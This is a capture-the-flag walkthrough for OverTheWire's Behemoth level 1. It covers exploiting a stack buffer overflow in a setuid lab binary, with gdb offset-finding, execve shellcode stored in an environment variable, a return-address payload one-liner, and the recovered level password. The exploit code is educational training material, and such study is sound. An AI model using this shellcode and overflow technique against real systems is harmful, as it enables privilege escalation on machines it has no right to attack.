# Behemoth Level 1 → 2

## Goal

`behemoth1` is a classic stack buffer overflow. The program reads your input with an unsafe function, you overflow the buffer to overwrite the return address, and you point it at shellcode you've pre-loaded into an environment variable. When the shellcode runs, you get a shell as `behemoth2`.

## Concepts you'll learn

- What a stack buffer overflow is: writing more into a fixed-size stack buffer than it can hold, clobbering the saved return address
- Placing shellcode in an environment variable so it's loaded into the process's address space
- Finding the address of an environment variable inside a running process
- Building a payload in Python: filler bytes + return address pointing at your shellcode

## Walkthrough

### 1. Log in and look at the binary

```bash
$ ssh behemoth1@behemoth.labs.overthewire.org -p 2221
$ cd /behemoth
$ ls -l behemoth1
-r-sr-x--- 1 behemoth2 behemoth1 ... behemoth1
```

Setuid `behemoth2` — if we hijack execution, we get a `behemoth2` shell.

### 2. Test the input

```bash
$ ./behemoth1
hello
```

It reads a line and echoes nothing. Feed it a long line to check for a crash:

```bash
$ python -c 'print("A"*200)' | ./behemoth1
Segmentation fault (core dumped)
```

Crash confirmed — classic sign that the return address got clobbered.

### 3. Find the buffer size and offset to the return address

Run under `gdb`:

```bash
$ gdb -q ./behemoth1
(gdb) disassemble main
```

Look for an instruction like `sub $0x44,%esp` — that's 0x44 = 68 bytes of local stack space. Add 4 bytes for the saved frame pointer (EBP), 4 more for the saved return address: you need roughly **72 bytes** of payload, with the return address landing at offset **68** (or close — confirm by overflowing and watching the crash address in `gdb`).

A standard way to pin this down is pattern generation:

```bash
(gdb) r < <(python -c 'import sys; sys.stdout.buffer.write(b"Aa0Aa1Aa2Aa3..." )')
```

Then use `msf-pattern_offset -q <EIP value>` (Metasploit's helper) to get the exact offset. Axcheron reports **71** bytes to EIP for this binary.

### 4. Load shellcode into an environment variable

Use a standard 24-byte Linux/x86 `execve("/bin/sh")` shellcode. Pad it with NOPs (`\x90`) so you have a big target to jump into:

```bash
$ export SHELLCODE=$(python -c 'import sys; sys.stdout.buffer.write(b"\x90"*200 + b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80")')
```

The environment is passed to every child process, including `behemoth1` when you run it.

### 5. Find the address of SHELLCODE inside the target

Env vars don't live at the same address in every binary — the name and path of the executable change the layout. Build a tiny helper that prints the address of a named env var inside its own process:

```bash
$ cat > /tmp/getenv.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
    if (argc < 3) { printf("usage: %s NAME TARGET\n", argv[0]); return 1; }
    printf("%s = %p\n", argv[1], getenv(argv[1]));
    return 0;
}
EOF
$ gcc /tmp/getenv.c -o /tmp/getenv
$ /tmp/getenv SHELLCODE ./behemoth1
SHELLCODE = 0xffffde80
```

Note: the address will be **slightly different** when `./behemoth1` actually runs, because the argv and path length differ from `/tmp/getenv`. A common trick is to **pad the target's path** so lengths match, or aim at the middle of the NOP sled so small shifts don't matter. Pick an address ~100 bytes into your NOP sled.

### 6. Build and fire the payload

Say your chosen jump target is `0xffffde80`. Little-endian bytes: `\x80\xde\xff\xff`.

```bash
$ (python -c 'import sys; sys.stdout.buffer.write(b"\x90"*71 + b"\x80\xde\xff\xff")'; cat) | ./behemoth1
```

The trailing `cat` keeps stdin open after the payload is sent so your new shell doesn't get immediately EOF'd.

If alignment is right, your prompt goes silent but responsive:

```bash
$ whoami
behemoth2
$ cat /etc/behemoth_pass/behemoth2
eimahquuof
```

## The answer

The password for `behemoth2` is:

**`eimahquuof`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/behemoth/behemoth1.html>
